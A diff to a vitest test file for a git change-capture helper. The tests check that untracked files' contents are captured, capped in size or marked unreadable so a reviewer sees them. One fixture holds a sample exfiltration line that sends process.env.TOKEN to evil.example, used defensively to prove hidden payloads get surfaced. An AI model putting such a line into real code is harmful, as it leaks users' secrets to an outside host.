@@ -1,7 +1,7 @@
 import { describe, expect, it, vi } from "vitest";
 import { ServerBusyError } from "../src/exec.js";
 import type { Exec } from "../src/exec.js";
-import { captureChange, isGitRepo, worktreeDirty } from "../src/git.js";
+import { MAX_UNTRACKED_FILE_BYTES, captureChange, isGitRepo, worktreeDirty } from "../src/git.js";
 
 const mockExec = (
   calls: Array<{
@@ -107,6 +107,30 @@ describe("worktreeDirty", () => {
 });
 
 describe("captureChange", () => {
+  it("surfaces an unreadable untracked file as a placeholder, not a silent empty body", async () => {
+    // git exits >1 when it cannot read the file (e.g. permission denied); an
+    // empty body would read to the reviewer as "nothing to see", hiding content.
+    const exec = mockExec([
+      { args: ["diff", "--stat", "HEAD"], result: { stdout: "", stderr: "", exitCode: 0 } },
+      { args: ["diff", "HEAD"], result: { stdout: "", stderr: "", exitCode: 0 } },
+      {
+        args: ["ls-files", "--others", "--exclude-standard"],
+        result: { stdout: "locked.bin\n", stderr: "", exitCode: 0 },
+      },
+      {
+        args: ["--no-pager", "diff", "--no-index", "--", "/dev/null", "locked.bin"],
+        result: { stdout: "", stderr: "fatal: cannot read", exitCode: 128 },
+      },
+    ]);
+
+    const result = await captureChange(exec, "/repo");
+
+    expect(result.untracked).toHaveLength(1);
+    expect(result.untracked[0].path).toBe("locked.bin");
+    expect(result.untracked[0].truncated).toBe(true);
+    expect(result.untracked[0].content).toMatch(/unreadable/i);
+  });
+
   it("parses stat, diff, and untracked with blank lines dropped", async () => {
     const exec = mockExec([
       {
@@ -121,18 +145,92 @@ describe("captureChange", () => {
         args: ["ls-files", "--others", "--exclude-standard"],
         result: { stdout: "new-file.txt\n\nanother.txt\n", stderr: "", exitCode: 0 },
       },
+      {
+        args: ["--no-pager", "diff", "--no-index", "--", "/dev/null", "new-file.txt"],
+        result: { stdout: "+first body\n", stderr: "", exitCode: 1 },
+      },
+      {
+        args: ["--no-pager", "diff", "--no-index", "--", "/dev/null", "another.txt"],
+        result: { stdout: "+second body\n", stderr: "", exitCode: 1 },
+      },
     ]);
 
     const result = await captureChange(exec, "/repo");
 
     expect(result.stat).toBe(" file.txt | 5 ++++\n\n");
     expect(result.diff).toBe("@@ -1,3 +1,5 @@\n+new line\n");
-    expect(result.untracked).toEqual(["new-file.txt", "another.txt"]);
+    expect(result.untrackedTruncated).toBe(false);
+    expect(result.untracked).toEqual([
+      { path: "new-file.txt", content: "+first body\n", truncated: false },
+      { path: "another.txt", content: "+second body\n", truncated: false },
+    ]);
     expect(exec).toHaveBeenNthCalledWith(1, "git", ["diff", "--stat", "HEAD"], { cwd: "/repo" });
     expect(exec).toHaveBeenNthCalledWith(2, "git", ["diff", "HEAD"], { cwd: "/repo" });
     expect(exec).toHaveBeenNthCalledWith(3, "git", ["ls-files", "--others", "--exclude-standard"], {
       cwd: "/repo",
     });
+  });
+
+  it("returns the CONTENTS of an untracked file, not just its name", async () => {
+    const malicious = "+const exfil = () => fetch('http://evil.example/' + process.env.TOKEN);\n";
+    const exec = mockExec([
+      {
+        args: ["diff", "--stat", "HEAD"],
+        result: { stdout: "", stderr: "", exitCode: 0 },
+      },
+      {
+        args: ["diff", "HEAD"],
+        result: { stdout: "", stderr: "", exitCode: 0 },
+      },
+      {
+        args: ["ls-files", "--others", "--exclude-standard"],
+        result: { stdout: "payload.ts\n", stderr: "", exitCode: 0 },
+      },
+      {
+        args: ["--no-pager", "diff", "--no-index", "--", "/dev/null", "payload.ts"],
+        result: { stdout: malicious, stderr: "", exitCode: 1 },
+      },
+    ]);
+
+    const result = await captureChange(exec, "/repo");
+
+    expect(result.untracked).toHaveLength(1);
+    expect(result.untracked[0].path).toBe("payload.ts");
+    expect(result.untracked[0].content).toContain("exfil");
+    expect(result.untracked[0].content).toContain("process.env.TOKEN");
+    expect(result.untracked[0].truncated).toBe(false);
+    expect(exec).toHaveBeenCalledWith(
+      "git",
+      ["--no-pager", "diff", "--no-index", "--", "/dev/null", "payload.ts"],
+      { cwd: "/repo" },
+    );
+  });
+
+  it("truncates an untracked file that exceeds the per-file byte cap", async () => {
+    const huge = "x".repeat(MAX_UNTRACKED_FILE_BYTES + 500);
+    const exec = mockExec([
+      {
+        args: ["diff", "--stat", "HEAD"],
+        result: { stdout: "", stderr: "", exitCode: 0 },
+      },
+      {
+        args: ["diff", "HEAD"],
+        result: { stdout: "", stderr: "", exitCode: 0 },
+      },
+      {
+        args: ["ls-files", "--others", "--exclude-standard"],
+        result: { stdout: "big.bin\n", stderr: "", exitCode: 0 },
+      },
+      {
+        args: ["--no-pager", "diff", "--no-index", "--", "/dev/null", "big.bin"],
+        result: { stdout: huge, stderr: "", exitCode: 1 },
+      },
+    ]);
+
+    const result = await captureChange(exec, "/repo");
+
+    expect(result.untracked[0].truncated).toBe(true);
+    expect(Buffer.byteLength(result.untracked[0].content, "utf8")).toBe(MAX_UNTRACKED_FILE_BYTES);
   });
 
   it("propagates when the diff call throws", async () => {
